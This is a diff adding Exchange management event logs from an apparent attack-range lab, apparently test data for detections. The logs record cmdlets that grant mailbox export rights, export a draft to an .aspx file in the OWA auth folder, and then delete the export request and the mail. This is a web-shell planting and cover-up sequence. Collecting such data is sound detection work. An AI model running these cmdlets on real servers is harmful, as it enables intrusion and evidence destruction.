@@ -1,0 +1,96 @@
+11/21/2022 08:09:04 PM
+LogName=MSExchange Management
+EventCode=1
+EventType=4
+ComputerName=win-dc-exch01.attackrange.local
+SourceName=MSExchange CmdletLogs
+Type=Information
+RecordNumber=1897
+Keywords=Classic
+TaskCategory=General
+OpCode=None
+Message=Cmdlet suceeded. Cmdlet Search-Mailbox, parameters -Identity "Administrator@attackrange.local" -SearchQuery "Subject:"Fay10dOWecFg"" -Force "True" -DeleteContent "True".
+11/21/2022 08:09:02 PM
+LogName=MSExchange Management
+EventCode=1
+EventType=4
+ComputerName=win-dc-exch01.attackrange.local
+SourceName=MSExchange CmdletLogs
+Type=Information
+RecordNumber=1896
+Keywords=Classic
+TaskCategory=General
+OpCode=None
+Message=Cmdlet suceeded. Cmdlet Remove-MailboxExportRequest, parameters -Identity "Administrator@attackrange.local\dYbLTCleBT" -Confirm "False".
+11/21/2022 08:03:51 PM
+LogName=MSExchange Management
+EventCode=1
+EventType=4
+ComputerName=win-dc-exch01.attackrange.local
+SourceName=MSExchange CmdletLogs
+Type=Information
+RecordNumber=1892
+Keywords=Classic
+TaskCategory=General
+OpCode=None
+Message=Cmdlet suceeded. Cmdlet New-MailboxExportRequest, parameters -Name "dYbLTCleBT" -Mailbox "Administrator@attackrange.local" -IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq 'Fay10dOWecFg')" -ExcludeDumpster "True" -FilePath "\\win-dc-exch01.attackrange.local\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\43yYO1sP.aspx".
+11/21/2022 08:03:50 PM
+LogName=MSExchange Management
+EventCode=1
+EventType=4
+ComputerName=win-dc-exch01.attackrange.local
+SourceName=MSExchange CmdletLogs
+Type=Information
+RecordNumber=1891
+Keywords=Classic
+TaskCategory=General
+OpCode=None
+Message=Cmdlet suceeded. Cmdlet New-ManagementRoleAssignment, parameters -Role "Mailbox Import Export" -User "Administrator@attackrange.local".
+11/21/2022 05:27:27 PM
+LogName=MSExchange Management
+EventCode=1
+EventType=4
+ComputerName=win-dc-exch01.attackrange.local
+SourceName=MSExchange CmdletLogs
+Type=Information
+RecordNumber=1794
+Keywords=Classic
+TaskCategory=General
+OpCode=None
+Message=Cmdlet suceeded. Cmdlet Search-Mailbox, parameters -Identity "Administrator@attackrange.local" -SearchQuery "Subject:"AvcMRhPdI"" -Force "True" -DeleteContent "True".
+11/21/2022 05:27:25 PM
+LogName=MSExchange Management
+EventCode=1
+EventType=4
+ComputerName=win-dc-exch01.attackrange.local
+SourceName=MSExchange CmdletLogs
+Type=Information
+RecordNumber=1793
+Keywords=Classic
+TaskCategory=General
+OpCode=None
+Message=Cmdlet suceeded. Cmdlet Remove-MailboxExportRequest, parameters -Identity "Administrator@attackrange.local\OnmrPW8m8Uv" -Confirm "False".
+11/21/2022 05:22:01 PM
+LogName=MSExchange Management
+EventCode=1
+EventType=4
+ComputerName=win-dc-exch01.attackrange.local
+SourceName=MSExchange CmdletLogs
+Type=Information
+RecordNumber=1789
+Keywords=Classic
+TaskCategory=General
+OpCode=None
+Message=Cmdlet suceeded. Cmdlet New-MailboxExportRequest, parameters -Name "OnmrPW8m8Uv" -Mailbox "Administrator@attackrange.local" -IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq 'AvcMRhPdI')" -ExcludeDumpster "True" -FilePath "\\win-dc-exch01.attackrange.local\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\ZnTQs2wv.aspx".
+11/21/2022 05:21:55 PM
+LogName=MSExchange Management
+EventCode=1
+EventType=4
+ComputerName=win-dc-exch01.attackrange.local
+SourceName=MSExchange CmdletLogs
+Type=Information
+RecordNumber=1788
+Keywords=Classic
+TaskCategory=General
+OpCode=None
+Message=Cmdlet suceeded. Cmdlet New-ManagementRoleAssignment, parameters -Role "Mailbox Import Export" -User "Administrator@attackrange.local".
